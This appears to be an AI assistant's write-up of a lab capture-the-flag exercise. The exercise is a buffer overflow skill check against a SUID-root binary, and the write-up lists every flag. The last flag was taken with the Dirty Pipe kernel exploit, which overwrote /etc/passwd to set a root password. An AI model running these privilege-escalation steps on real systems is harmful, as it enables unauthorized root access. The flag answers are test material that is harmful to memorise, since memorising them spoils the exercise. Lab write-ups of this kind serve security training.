Here is your **fully updated and completed lab report** with the full breakdown for all five flags, including your Dirty Pipe exploitation method for Flag 5:

---

# ðŸ§  Buffer Overflow CTF 1 â€“ Lab Report (INE | eCPPTv3 Skill Check)

**Target Host:** `10.2.22.73`
**User:** `student`
**Kernel:** `Linux 5.11`
**Binary:** `/opt/wow` (SUID-root)

---

## ðŸŽ¯ Objective

Exploit a SUID-root binary (`/opt/wow`) vulnerable to buffer overflow, identify key exploitation metrics, and escalate privileges to capture `Flag 5` from `/root/flag.txt`.

---

## âœ… Flag 1 â€“ Privilege Escalation Function

**Command:**

```bash
nm /opt/wow | grep ' T '
```

**Result:**

```
08049236 T secretFunc
08049290 T engageUser
```

`secretFunc` contains the logic to escalate privileges via `setuid(0); setgid(0); system("/bin/sh");`.

**âœ… Flag 1:** `secretFunc`

---

## âœ… Flag 2 â€“ Unsafe Operation Causing Buffer Overflow

**Method:**
Reverse engineering `engageUser` in GDB revealed an unsafe call to `scanf` without input bounds.

**âœ… Flag 2:** `scanf`

---

## âœ… Flag 3 â€“ Input Size Causing First Crash

**Method:**
Fuzzed the binary with a cyclic pattern:

```bash
msf-pattern_create -l 100
```

Observed crash at **38 bytes** (buffer overflow before EIP overwrite).

**âœ… Flag 3:** `38`

---

## âœ… Flag 4 â€“ Offset Where Return Address Is Overwritten

**Tool:**

```bash
msf-pattern_offset -q 41346241
```

Determined EIP was overwritten at **42 bytes**.

**âœ… Flag 4:** `42`

---

## âœ… Flag 5 â€“ Read `/root/flag.txt`

### Initial Attempts:

* Buffer overflow successfully redirected execution to `secretFunc`, but did **not escalate privileges** due to modern protections.
* Tried calling `system("cat /root/flag.txt")` via GDB â€” returned "Permission denied" due to lack of real UID 0.

### ðŸ§¨ Final Exploit Used: **Dirty Pipe (CVE-2022-0847)**

**Steps:**

1. **Created static exploit binary** from known Dirty Pipe PoC:

   ```bash
   nano dirtypipe.c    # Pasted exploit code
   gcc dirtypipe.c -o dirtypipe -static
   ```

2. **Transferred to target:**

   ```bash
   scp dirtypipe student@10.2.22.73:~
   ```

3. **Executed exploit:**

   ```bash
   chmod +x dirtypipe
   ./dirtypipe
   ```

   Output:

   ```
   Backing up /etc/passwd to /tmp/passwd.bak ...
   Setting root password to "aaron"...
   system() function call seems to have failed :(
   ```

4. **Switched to root manually:**

   ```bash
   su -
   # Password: aaron
   ```

5. **Retrieved Flag 5:**

   ```bash
   cat /root/flag.txt
   ```

   **âœ… Flag 5:** `ac120430fcfa752b6acc52f81c5e3007`

---

## ðŸ§¾ Final Flag Summary

| Task | Flag                               |
| ---- | ---------------------------------- |
| 1    | `secretFunc`                       |
| 2    | `scanf`                            |
| 3    | `38`                               |
| 4    | `42`                               |
| 5    | `ac120430fcfa752b6acc52f81c5e3007` |

---

## ðŸ§¹ Optional Cleanup (Restore /etc/passwd)

```bash
cp /tmp/passwd.bak /etc/passwd
```

---

Let me know if you'd like this formatted for PDF, markdown, or included in your full eCPPTv3 lab portfolio.
